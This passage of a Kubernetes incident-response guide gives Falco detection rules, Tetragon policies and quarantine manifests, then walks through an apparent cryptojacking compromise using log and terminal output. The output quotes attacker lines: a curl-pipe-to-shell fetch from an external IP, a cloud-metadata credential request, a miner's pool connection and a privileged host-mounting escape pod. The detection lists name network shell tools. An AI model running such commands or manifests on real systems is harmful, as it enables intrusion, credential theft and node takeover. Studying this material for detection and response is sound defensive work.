      tags: [k8s, mitre_defense_evasion, T1070]
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco-k8saudit
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
    app.kubernetes.io/component: k8saudit
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: falco
      app.kubernetes.io/component: k8saudit
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falco
        app.kubernetes.io/component: k8saudit
    spec:
      # Must run on control-plane nodes: the API server dials 127.0.0.1:9765
      # from the host network namespace.
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
      nodeSelector:
        node-role.kubernetes.io/control-plane: ""
      tolerations:
        - key: node-role.kubernetes.io/control-plane
          operator: Exists
          effect: NoSchedule
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      serviceAccountName: falco
      containers:
        - name: falco
          image: falcosecurity/falco-no-driver:0.41.0
          args:
            - /usr/bin/falco
            - -c
            - /etc/falco/falco.yaml
          ports:
            - name: k8saudit
              containerPort: 9765
              protocol: TCP
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: false
            capabilities:
              drop: ["ALL"]
          resources:
            requests:
              cpu: 100m
              memory: 256Mi
            limits:
              cpu: 1000m
              memory: 1Gi
          volumeMounts:
            - name: falco-config
              mountPath: /etc/falco/falco.yaml
              subPath: falco.yaml
              readOnly: true
            - name: falco-audit-rules
              mountPath: /etc/falco/rules.d
              readOnly: true
            - name: tmp
              mountPath: /tmp
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 30
            periodSeconds: 15
      volumes:
        - name: falco-config
          configMap:
            name: falco-k8saudit-config
        - name: falco-audit-rules
          configMap:
            name: falco-audit-rules
        - name: tmp
          emptyDir: {}
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: falco
  namespace: falco
```

### 3.4 Falco syscall rules for the in-container phases

`rules.d/attack-phases.yaml` — the rules that cover phases 1–4 and 6, which the audit log cannot see at all.

```yaml
- required_engine_version: 0.38.0

- list: shell_binaries
  items: [ash, bash, csh, dash, ksh, sh, tcsh, zsh, busybox]

- list: network_tools
  items: [curl, wget, nc, ncat, netcat, socat, telnet, ssh, ftp, tftp]

- list: recon_tools
  items: [nmap, masscan, ping, dig, nslookup, host, arp, ip, ifconfig,
          netstat, ss, whoami, id, uname, hostname, kubectl, crictl, amicontained]

- list: package_managers
  items: [apt, apt-get, dpkg, yum, dnf, rpm, apk, pip, pip3, npm, gem]

- macro: container
  condition: (container.id != host)

- macro: spawned_process
  condition: (evt.type = execve and evt.dir = <)

- macro: sensitive_sa_token_path
  condition: (fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount")

- macro: cloud_metadata_endpoint
  condition: (fd.sip = "169.254.169.254" or fd.sip = "100.100.100.200"
              or fd.sip = "169.254.170.2")

- macro: exclude_known_agents
  condition: >
    (not container.image.repository in
      ("docker.io/falcosecurity/falco", "quay.io/cilium/tetragon",
       "registry.k8s.io/kube-proxy", "docker.io/library/fluent-bit"))

# ---- PHASE 2: EXECUTION --------------------------------------------------
- rule: Shell Spawned In Container
  desc: >
    A shell was executed inside a container. In an immutable, distroless
    production image this is impossible during normal operation and is the
    earliest reliable indicator of hands-on-keyboard activity following RCE.
  condition: >
    spawned_process and container and proc.name in (shell_binaries)
    and exclude_known_agents
  output: >
    Shell spawned in container
    (user=%user.name uid=%user.uid shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline pid=%proc.pid ppid=%proc.ppid
     container_id=%container.id image=%container.image.repository:%container.image.tag
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: WARNING
  tags: [container, shell, mitre_execution, T1059]

- rule: Package Manager Executed In Container
  desc: >
    A package manager ran at runtime. Images are built in CI; runtime
    installation means an attacker is staging tooling into the container.
  condition: >
    spawned_process and container and proc.name in (package_managers)
  output: >
    Package management tool run in container
    (user=%user.name command=%proc.cmdline
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: ERROR
  tags: [container, mitre_execution, T1059]

# ---- PHASE 3: DISCOVERY --------------------------------------------------
- rule: Container Reconnaissance Tooling
  desc: Enumeration binaries executed inside a workload container.
  condition: >
    spawned_process and container and proc.name in (recon_tools)
    and exclude_known_agents
  output: >
    Recon tool executed in container
    (tool=%proc.name cmdline=%proc.cmdline parent=%proc.pname
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: NOTICE
  tags: [container, mitre_discovery, T1613]

# ---- PHASE 4: CREDENTIAL ACCESS -----------------------------------------
- rule: ServiceAccount Token Read By Unexpected Process
  desc: >
    The projected ServiceAccount token was opened by a process that is not
    the application's own runtime. The Kubernetes client libraries read this
    file once at startup; a read by a shell or a network tool is theft.
  condition: >
    open_read and container and sensitive_sa_token_path
    and proc.name in (shell_binaries, network_tools, recon_tools)
  output: >
    ServiceAccount token read by suspicious process
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [container, mitre_credential_access, T1552.007]

- rule: Cloud Instance Metadata Accessed From Container
  desc: >
    A container connected to the cloud instance metadata service. This is the
    standard pivot from container RCE to cloud IAM credentials.
  condition: >
    (evt.type in (connect, sendto) and evt.dir = <)
    and container and cloud_metadata_endpoint
    and exclude_known_agents
  output: >
    Cloud metadata endpoint contacted from container
    (process=%proc.name cmdline=%proc.cmdline connection=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, cloud, mitre_credential_access, T1552.005]

# ---- PHASE 6: PRIVILEGE ESCALATION / ESCAPE ------------------------------
- rule: Container Escape Via Namespace Switch
  desc: >
    setns/nsenter observed, or a process entered the host mount namespace.
    This is the terminal step of a container escape.
  condition: >
    spawned_process and container
    and (proc.name = nsenter
         or proc.cmdline contains "/proc/1/ns"
         or proc.cmdline contains "/proc/1/root")
  output: >
    Container escape attempt via namespace switch
    (process=%proc.name cmdline=%proc.cmdline pid=%proc.pid
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation, T1611]

- rule: Container Runtime Socket Accessed
  desc: >
    A container opened the container runtime socket. Write access to this
    socket is equivalent to root on the node.
  condition: >
    (evt.type in (open, openat, openat2, connect) and evt.dir = <)
    and container
    and fd.name in ("/var/run/docker.sock", "/run/containerd/containerd.sock",
                    "/var/run/crio/crio.sock", "/run/crio/crio.sock")
    and exclude_known_agents
  output: >
    Container runtime socket accessed from container
    (process=%proc.name cmdline=%proc.cmdline socket=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation, T1610]

# ---- PHASE 7: PERSISTENCE ON THE NODE ------------------------------------
- rule: Static Pod Manifest Written
  desc: >
    A file was written into the kubelet static pod directory. A static pod is
    started directly by the kubelet, is not subject to admission control, and
    cannot be deleted through the API server. This is durable node persistence.
  condition: >
    (evt.type in (open, openat, openat2, creat, rename, renameat2)
     and evt.dir = < and evt.is_open_write = true)
    and fd.directory in ("/etc/kubernetes/manifests", "/etc/kubelet.d")
    and not proc.name in ("kubeadm", "dpkg", "rpm")
  output: >
    Static pod manifest written
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name
     container_id=%container.id image=%container.image.repository
     user=%user.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_persistence, T1543.005]

# ---- PHASE 8: DEFENSE EVASION --------------------------------------------
- rule: Security Tooling Terminated
  desc: A security agent process was killed or its kernel module unloaded.
  condition: >
    spawned_process
    and ((proc.name in (kill, pkill, killall)
          and (proc.cmdline contains "falco" or proc.cmdline contains "tetragon"
               or proc.cmdline contains "auditd"))
         or (proc.name = rmmod and proc.cmdline contains "falco")
         or (proc.name = systemctl
             and proc.cmdline contains "stop"
             and (proc.cmdline contains "falco" or proc.cmdline contains "auditd")))
  output: >
    Attempt to disable security tooling
    (process=%proc.name cmdline=%proc.cmdline user=%user.name
     container_id=%container.id ns=%k8s.ns.name pod=%k8s.pod.name
     node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_defense_evasion, T1562.001]

- rule: Log File Truncated Or Deleted
  desc: Removal or truncation of audit and system logs — anti-forensics.
  condition: >
    (evt.type in (unlink, unlinkat, rename, renameat2, truncate, ftruncate)
     and evt.dir = <)
    and (fd.directory in ("/var/log/kubernetes/audit", "/var/log/audit")
         or fd.name endswith "audit.log")
    and not proc.name in ("kube-apiserver", "auditd", "logrotate", "fluent-bit", "vector")
  output: >
    Audit log tampering detected
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name user=%user.name
     node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_defense_evasion, T1070.002]
```

### 3.5 Tetragon TracingPolicy — enforcement, not just detection

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: block-serviceaccount-token-theft
  namespace: prod
spec:
  kprobes:
    - call: "security_file_permission"
      syscall: false
      return: true
      args:
        - index: 0
          type: "file"
        - index: 1
          type: "int"
      returnArg:
        index: 0
        type: "int"
      returnArgAction: "Post"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount/token"
          matchBinaries:
            # Anything that is NOT the application binary reading the token
            - operator: "NotIn"
              values:
                - "/usr/local/bin/payment-api"
          matchActions:
            - action: Sigkill      # in-kernel enforcement, not an alert
---
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: observe-process-execution
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"        # container processes only
```

### 3.6 Incident containment: quarantine without destroying evidence

The containment primitive is **network isolation plus scheduling isolation**, never deletion. Note the label-swap technique: changing the pod's label removes it from the Service endpoints *and* from the ReplicaSet's selector, so the controller creates a healthy replacement while the compromised pod stays alive and attached for analysis.

```yaml
# 1. Deny-all NetworkPolicy targeting the quarantine label.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-deny-all
  namespace: prod
spec:
  podSelector:
    matchLabels:
      incident.security/quarantine: "true"
  policyTypes:
    - Ingress
    - Egress
  # Empty ingress and egress rule sets = deny everything, both directions.
  ingress: []
  egress: []
---
# 2. Optional: allow ONLY the forensic collector to reach the pod, so the
#    responder can still stream evidence out of an otherwise-isolated pod.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-allow-forensics
  namespace: prod
spec:
  podSelector:
    matchLabels:
      incident.security/quarantine: "true"
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: incident-response
          podSelector:
            matchLabels:
              app: forensic-collector
```

Evidence collection Job that pulls the checkpoint archive off the node:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: forensic-collect-inc-2026-0805
  namespace: incident-response
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        app: forensic-collector
    spec:
      restartPolicy: Never
      nodeName: node-worker-03            # pin to the compromised node
      hostPID: false
      tolerations:
        - operator: Exists                # tolerate the quarantine taint
      containers:
        - name: collector
          image: registry.internal/ir/collector:1.4.0
          command: ["/bin/sh", "-c"]
          args:
            - |
              set -euo pipefail
              INCIDENT=inc-2026-0805
              OUT=/evidence/${INCIDENT}
              mkdir -p "${OUT}"

              echo "[*] Copying CRI checkpoint archives"
              cp -av /host/var/lib/kubelet/checkpoints/*.tar "${OUT}/" || true

              echo "[*] Capturing container runtime state"
              cp -av /host/var/log/pods "${OUT}/pod-logs" || true

              echo "[*] Hashing every artifact for chain of custody"
              ( cd "${OUT}" && find . -type f -exec sha256sum {} \; ) \
                > "${OUT}/MANIFEST.sha256"

              echo "[*] Done"
              ls -la "${OUT}"
          securityContext:
            runAsUser: 0
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
              add: ["DAC_READ_SEARCH"]
          volumeMounts:
            - name: host-kubelet
              mountPath: /host/var/lib/kubelet
              readOnly: true
            - name: host-podlogs
              mountPath: /host/var/log/pods
              readOnly: true
            - name: evidence
              mountPath: /evidence
      volumes:
        - name: host-kubelet
          hostPath:
            path: /var/lib/kubelet
            type: Directory
        - name: host-podlogs
          hostPath:
            path: /var/log/pods
            type: Directory
        - name: evidence
          persistentVolumeClaim:
            claimName: forensic-evidence-wormstore
```

---

## 4. CLI Commands and Real Terminal Output

### 4.1 Confirming the audit pipeline is alive

```
$ sudo ls -la /var/log/kubernetes/audit/
total 184320
drwxr-xr-x 2 root root      4096 Aug  5 09:14 .
drwxr-xr-x 4 root root      4096 Aug  1 00:00 ..
-rw------- 1 root root 187293184 Aug  5 14:21 audit.log
-rw------- 1 root root  12884901 Aug  4 22:03 audit-2026-08-04T22-03-11.117.log.gz

$ sudo tail -n 1 /var/log/kubernetes/audit/audit.log | jq -c '{stage,verb,uri:.requestURI,user:.user.username}'
{"stage":"ResponseComplete","verb":"list","uri":"/api/v1/namespaces/prod/pods?limit=500","user":"system:serviceaccount:monitoring:prometheus"}

$ sudo grep -c '"kind":"Event"' /var/log/kubernetes/audit/audit.log
1428193
```

### 4.2 Phase detection — the runtime alert that opens the incident

```
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --tail=20 -f
14:18:02.114398219: Warning Shell spawned in container (user=root uid=0 shell=sh parent=node cmdline=sh -c "curl -s http://185.220.101.7/x.sh | sh" pid=214417 ppid=214392 container_id=8f3c2a91b4de image=registry.internal/prod/payment-api:2.9.1 ns=prod pod=payment-api-7d9c4f8b6-2xk9v node=node-worker-03)
14:18:04.882910337: Notice Recon tool executed in container (tool=id cmdline=id parent=sh container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v)
14:18:07.331004112: Critical ServiceAccount token read by suspicious process (process=cat cmdline=cat /var/run/secrets/kubernetes.io/serviceaccount/token file=/var/run/secrets/kubernetes.io/serviceaccount/token container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v node=node-worker-03)
14:18:09.007712558: Critical Cloud metadata endpoint contacted from container (process=curl cmdline=curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ connection=10.244.3.17:41220->169.254.169.254:80 container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v)
```

Four phases in seven seconds: Execution → Discovery → Credential Access → Credential Access (cloud). The `parent=node` field is the smoking gun for phase 1: the Node.js application process itself spawned the shell, which means the initial access was application-layer RCE, not a stolen `kubectl` credential.

### 4.3 Pivoting to the audit log with the stolen identity

The runtime alert gives you the pod. Resolve the pod to its ServiceAccount, then search the audit log for what that identity did:

```
$ kubectl -n prod get pod payment-api-7d9c4f8b6-2xk9v \
    -o jsonpath='{.spec.serviceAccountName}{"\n"}{.metadata.uid}{"\n"}{.status.podIP}{"\n"}'
payment-api
5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7
10.244.3.17
```

```
$ sudo jq -c 'select(.user.username == "system:serviceaccount:prod:payment-api")
              | {t: .requestReceivedTimestamp, verb, uri: .requestURI,
                 code: .responseStatus.code, src: .sourceIPs[0], ua: .userAgent}' \
    /var/log/kubernetes/audit/audit.log | tail -n 12
{"t":"2026-08-05T14:18:22.441029Z","verb":"get","uri":"/api/v1/namespaces/prod/pods","code":403,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:31.882117Z","verb":"list","uri":"/api/v1/namespaces/prod/secrets","code":200,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:35.104773Z","verb":"get","uri":"/api/v1/namespaces/prod/secrets/ci-registry-pull","code":200,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:41.669902Z","verb":"list","uri":"/api/v1/secrets","code":403,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:19:02.338451Z","verb":"create","uri":"/api/v1/namespaces/prod/pods","code":201,"src":"10.244.3.17","ua":"curl/8.5.0"}
```

Three findings, immediately:

1. **`userAgent: curl/8.5.0`** — a legitimate in-cluster client is a Kubernetes SDK (`kubernetes-python/…`, `kubernetes-client-java/…`, `client-go/v0.34.0`). Raw `curl` from a ServiceAccount is a hands-on-keyboard signature.
2. **The 403 → 200 → 403 pattern** is permission probing: the actor is mapping the boundary of the token's RBAC.
3. **`create` on `pods` returned 201** — phase 6 has begun.

Inspect exactly what they created. This is why Section A5 of the audit policy uses `level: Request` — without the body you cannot answer this question:

```
$ sudo jq 'select(.user.username == "system:serviceaccount:prod:payment-api"
                  and .verb == "create"
                  and .objectRef.resource == "pods")
           | .requestObject.spec' \
    /var/log/kubernetes/audit/audit.log | tail -n 40
{
  "volumes": [
    {
      "name": "hostroot",
      "hostPath": {
        "path": "/",
        "type": "Directory"
      }
    }
  ],
  "containers": [
    {
      "name": "shell",
      "image": "docker.io/library/alpine:3.20",
      "command": ["/bin/sh", "-c", "sleep 86400"],
      "resources": {},
      "volumeMounts": [
        {
          "name": "hostroot",
          "mountPath": "/host"
        }
      ],
      "securityContext": {
        "privileged": true
      }
    }
  ],
  "hostPID": true,
  "hostNetwork": true,
  "nodeName": "node-worker-03",
  "restartPolicy": "Never",
  "serviceAccountName": "payment-api"
}
```

A privileged, `hostPID`, `hostNetwork` pod with `/` mounted at `/host`, pinned to the same node. That is a complete node takeover in one manifest, and it was **admitted** — which is itself a finding: Pod Security Admission was not enforcing `restricted` (or `baseline`) on the `prod` namespace.

### 4.4 Reconstructing the full actor timeline

```
$ sudo jq -r 'select(.sourceIPs[0] == "10.244.3.17")
              | [.requestReceivedTimestamp, .user.username, .verb,
                 (.objectRef.resource // "-"), (.objectRef.subresource // "-"),
                 (.objectRef.namespace // "-"), (.objectRef.name // "-"),
                 (.responseStatus.code|tostring)] | @tsv' \
    /var/log/kubernetes/audit/audit.log | sort | column -t
2026-08-05T14:18:22Z  system:serviceaccount:prod:payment-api  get     pods        -     prod  -                403
2026-08-05T14:18:31Z  system:serviceaccount:prod:payment-api  list    secrets     -     prod  -                200
2026-08-05T14:18:35Z  system:serviceaccount:prod:payment-api  get     secrets     -     prod  ci-registry-pull 200
2026-08-05T14:18:41Z  system:serviceaccount:prod:payment-api  list    secrets     -     -     -                403
2026-08-05T14:19:02Z  system:serviceaccount:prod:payment-api  create  pods        -     prod  escape-pod       201
2026-08-05T14:19:44Z  system:serviceaccount:prod:payment-api  create  pods        exec  prod  escape-pod       101
2026-08-05T14:23:18Z  system:serviceaccount:kube-system:node-agent  create  clusterrolebindings  -  -  backup-operator  201
```

The last line is the phase transition. A *different* identity — `kube-system:node-agent` — created a `ClusterRoleBinding` four minutes later, from the same source IP. That means the attacker escaped to the node and harvested a second, more privileged token from `/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected-token-*/token`.

Verify the binding:

```
$ sudo jq 'select(.objectRef.resource=="clusterrolebindings" and .verb=="create")
           | {user: .user.username, name: .objectRef.name,
              role: .requestObject.roleRef.name,
              subjects: .requestObject.subjects,
              src: .sourceIPs[0]}' \
    /var/log/kubernetes/audit/audit.log | tail -n 20
{
  "user": "system:serviceaccount:kube-system:node-agent",
  "name": "backup-operator",
  "role": "cluster-admin",
  "subjects": [
    {
      "kind": "ServiceAccount",
      "name": "backup-agent",
      "namespace": "kube-system"
    }
  ],
  "src": "10.244.3.17"
}
```

**Phase 7 confirmed.** A dormant `cluster-admin` backdoor bound to an innocuously named ServiceAccount. If you had contained only the original pod, this would have survived and the actor would be back within the hour.

### 4.5 Hunting for the rest of the persistence

Never assume one backdoor. Sweep for all of the standard persistence primitives:

```
$ kubectl get clusterrolebindings -o json | jq -r '
    .items[]
    | select(.roleRef.name=="cluster-admin")
    | [.metadata.name, .metadata.creationTimestamp,
       ([.subjects[]? | "\(.kind)/\(.namespace // "-")/\(.name)"] | join(","))]
    | @tsv' | column -t
cluster-admin           2025-11-02T08:14:22Z  Group/-/system:masters
kubeadm:cluster-admins  2025-11-02T08:14:22Z  Group/-/kubeadm:cluster-admins
backup-operator         2026-08-05T14:23:18Z  ServiceAccount/kube-system/backup-agent
```

```
$ kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations \
    -o custom-columns='KIND:.kind,NAME:.metadata.name,CREATED:.metadata.creationTimestamp'
KIND                             NAME                      CREATED
MutatingWebhookConfiguration     pod-identity-webhook      2025-11-02T09:01:44Z
MutatingWebhookConfiguration     metrics-injector          2026-08-05T14:26:07Z
ValidatingWebhookConfiguration   gatekeeper-validating      2025-11-02T09:04:12Z

$ kubectl get mutatingwebhookconfiguration metrics-injector -o yaml | \
    yq '.webhooks[] | {name: .name, url: .clientConfig.url, rules: .rules}'
name: inject.metrics.local
url: https://185.220.101.7:8443/mutate
rules:
  - apiGroups: ["*"]
    apiVersions: ["*"]
    operations: ["CREATE"]
    resources: ["pods"]
    scope: "*"
```

A mutating webhook pointing at an **external IP address**, matching every pod creation cluster-wide. This is the highest-severity artifact in the entire incident: it rewrites every future pod in the cluster.

```
$ kubectl get cronjobs -A --sort-by=.metadata.creationTimestamp \
    -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SCHEDULE:.spec.schedule,IMAGE:.spec.jobTemplate.spec.template.spec.containers[*].image,CREATED:.metadata.creationTimestamp'
NS            NAME              SCHEDULE       IMAGE                              CREATED
prod          db-backup         0 2 * * *      registry.internal/ops/pgdump:1.2   2025-11-14T10:02:31Z
kube-system   kube-cleanup      */5 * * * *    docker.io/library/alpine:3.20      2026-08-05T14:27:55Z
```

```
$ for n in $(kubectl get nodes -o name); do
    echo "=== $n"
    kubectl debug $n -it --image=busybox:1.36 --profile=sysadmin -- \
      ls -la /host/etc/kubernetes/manifests/ 2>/dev/null | tail -n +2
  done
=== node/node-worker-03
total 20
drwxr-xr-x 2 root root 4096 Aug  5 14:29 .
drwxr-xr-x 4 root root 4096 Nov  2  2025 ..
-rw------- 1 root root 1421 Aug  5 14:29 kube-metrics-agent.yaml
```

A static pod manifest, written at 14:29 on the compromised node. Static pods are launched directly by the kubelet, never pass through admission control, and **cannot be deleted with `kubectl delete pod`** — the kubelet recreates them. They must be removed from the node's filesystem.

### 4.6 Containment without evidence destruction

**Step 1 — capture the container before touching anything.** CRI checkpointing (`ContainerCheckpoint`, beta and on by default since Kubernetes v1.30) is the only method that preserves process memory while the container keeps running:

```
$ sudo curl -sk -X POST \
    --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \
    --key  /etc/kubernetes/pki/apiserver-kubelet-client.key \
    "https://node-worker-03:10250/checkpoint/prod/payment-api-7d9c4f8b6-2xk9v/app" | jq .
{
  "items": [
    "/var/lib/kubelet/checkpoints/checkpoint-payment-api-7d9c4f8b6-2xk9v_prod-app-2026-08-05T14:31:07Z.tar"
  ]
}

$ sudo ls -lh /var/lib/kubelet/checkpoints/
total 412M
-rw------- 1 root root 412M Aug  5 14:31 checkpoint-payment-api-7d9c4f8b6-2xk9v_prod-app-2026-08-05T14:31:07Z.tar

$ sudo tar -tf /var/lib/kubelet/checkpoints/checkpoint-*.tar | head
bind.mounts
checkpoint/
checkpoint/core-1.img
checkpoint/pagemap-1.img
checkpoint/pages-1.img
checkpoint/fdinfo-2.img
checkpoint/files.img
config.dump
dump.log
rootfs-diff.tar
spec.dump
stats-dump
```

`rootfs-diff.tar` contains every file the attacker wrote into the container; `pages-1.img` is the process memory image.

**Step 2 — freeze the network path, keep the pod alive.**

```
$ kubectl -n prod label pod payment-api-7d9c4f8b6-2xk9v incident.security/quarantine=true
pod/payment-api-7d9c4f8b6-2xk9v labeled

$ kubectl apply -f quarantine-deny-all.yaml
networkpolicy.networking.k8s.io/quarantine-deny-all created

$ kubectl -n prod label pod payment-api-7d9c4f8b6-2xk9v app-             # strip the selector label
pod/payment-api-7d9c4f8b6-2xk9v unlabeled

$ kubectl -n prod get pods -l app=payment-api
NAME                           READY   STATUS    RESTARTS   AGE
payment-api-7d9c4f8b6-h4m2p    1/1     Running   0          18s      # ReplicaSet healed the service
payment-api-7d9c4f8b6-9nqz4    1/1     Running   0          6d
payment-api-7d9c4f8b6-tv8lc    1/1     Running   0          6d

$ kubectl -n prod get pod payment-api-7d9c4f8b6-2xk9v
NAME                           READY   STATUS    RESTARTS   AGE
payment-api-7d9c4f8b6-2xk9v    1/1     Running   0          6d       # quarantined, still alive
```

**Step 3 — isolate the node.**

```
$ kubectl cordon node-worker-03
node/node-worker-03 cordoned

$ kubectl taint node node-worker-03 incident.security/quarantine=true:NoExecute
node/node-worker-03 tainted

$ kubectl get node node-worker-03 -o wide
NAME             STATUS                     ROLES    AGE    VERSION   INTERNAL-IP
node-worker-03   Ready,SchedulingDisabled   <none>   276d   v1.34.0   10.0.1.23
```

> **Ordering matters.** `NoExecute` evicts every pod that does not tolerate the taint — including your quarantined evidence pod, unless you add the toleration first, and including your forensic collector Job unless it tolerates it too (which is why the Job manifest in §3.6 carries `tolerations: [{operator: Exists}]`). If you only need to stop new scheduling, `cordon` alone is safer.

**Step 4 — live triage with an ephemeral container** (does not restart the target, does not need a shell in the image):

```
$ kubectl -n prod debug payment-api-7d9c4f8b6-2xk9v -it \
    --image=nicolaka/netshoot:v0.13 --target=app --profile=general -- bash
Defaulting debug container name to debugger-x7k2m.
If you don't see a command prompt, try pressing enter.

debugger:~# ps auxf
PID   USER     TIME  COMMAND
    1 1000      2:14 node /app/server.js
  214 1000      0:00  \_ sh -c curl -s http://185.220.101.7/x.sh | sh
  219 1000      0:00      \_ sh
  341 1000     47:52          \_ ./kdevtmpfsi --url stratum+tcp://185.220.101.7:14444
  342 1000      0:00          \_ ./kinsing

debugger:~# ls -la /proc/341/cwd
lrwxrwxrwx 1 1000 1000 0 Aug  5 14:33 /proc/341/cwd -> /tmp

debugger:~# cat /proc/341/environ | tr '\0' '\n' | grep -i pool
POOL_URL=stratum+tcp://185.220.101.7:14444

debugger:~# ss -tnp
State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port  Process
ESTAB  0      0       10.244.3.17:41892     185.220.101.7:14444 users:(("kdevtmpfsi",pid=341,fd=7))

debugger:~# sha256sum /proc/341/exe /proc/342/exe
b4e7c9a1f2d83e5c6a0b91d47f3e28c5a6b7d901e2f34c58a9b0d1e2f3a4b5c6  /proc/341/exe
7c2a9e4b1d6f8302c5e7a9b0d1f2e3c4a5b6d7e8f90123456789abcdef012345  /proc/342/exe
```

`kdevtmpfsi` / `kinsing` is a well-known cryptomining family — **phase 9, Impact**, confirmed. Note that the process tree, the network connection and the binary hashes were all captured without restarting the container or alerting the attacker with a `kubectl exec` into their own shell.

**Step 5 — remove persistence, in dependency order.** Kill the cluster-wide implants first (webhook, RBAC), then the node-local ones:

```
$ kubectl get mutatingwebhookconfiguration metrics-injector -o yaml \
    > /evidence/inc-2026-0805/webhook-metrics-injector.yaml
$ kubectl delete mutatingwebhookconfiguration metrics-injector
mutatingwebhookconfiguration.admissionregistration.k8s.io "metrics-injector" deleted

$ kubectl get clusterrolebinding backup-operator -o yaml \
    > /evidence/inc-2026-0805/crb-backup-operator.yaml
$ kubectl delete clusterrolebinding backup-operator
clusterrolebinding.rbac.authorization.k8s.io "backup-operator" deleted

$ kubectl -n kube-system get cronjob kube-cleanup -o yaml \
    > /evidence/inc-2026-0805/cronjob-kube-cleanup.yaml
$ kubectl -n kube-system delete cronjob kube-cleanup
cronjob.batch "kube-cleanup" deleted

# Static pod: must be removed from the node filesystem, NOT via the API.
$ kubectl debug node/node-worker-03 -it --image=busybox:1.36 --profile=sysadmin -- \
    sh -c 'cp /host/etc/kubernetes/manifests/kube-metrics-agent.yaml /host/tmp/evidence.yaml \
           && rm -f /host/etc/kubernetes/manifests/kube-metrics-agent.yaml \
           && echo removed'
removed
```

**Step 6 — invalidate the stolen credentials.** A bound ServiceAccount token cannot be revoked individually; you rotate the underlying object:

```
$ kubectl -n prod delete serviceaccount payment-api
serviceaccount "payment-api" deleted
$ kubectl -n prod create serviceaccount payment-api
serviceaccount/payment-api created

$ kubectl -n prod rollout restart deployment/payment-api
deployment.apps/payment-api restarted

# Node identity is also suspect: the attacker had root on the node.
$ kubectl get csr | grep node-worker-03
csr-x8k2m   4m    kubernetes.io/kubelet-serving   system:node:node-worker-03   Approved,Issued
$ kubectl delete node node-worker-03
node "node-worker-03" deleted
```

### 4.7 Reconstructing what an identity was actually authorized to do

`audit2rbac` derives the minimal RBAC an identity exercised — invaluable both for scoping the blast radius and for writing the least-privilege replacement Role:

```
$ audit2rbac -f /var/log/kubernetes/audit/audit.log \
    --serviceaccount=prod:payment-api
Opening audit source...
Loading events...
Evaluating API calls...
Generating roles...
apiVersion: v1
kind: List
items:
- apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    labels:
      audit2rbac.liggitt.net/generated: "true"
      audit2rbac.liggitt.net/user: system-serviceaccount-prod-payment-api
    name: audit2rbac:system-serviceaccount-prod-payment-api
    namespace: prod
  rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
```

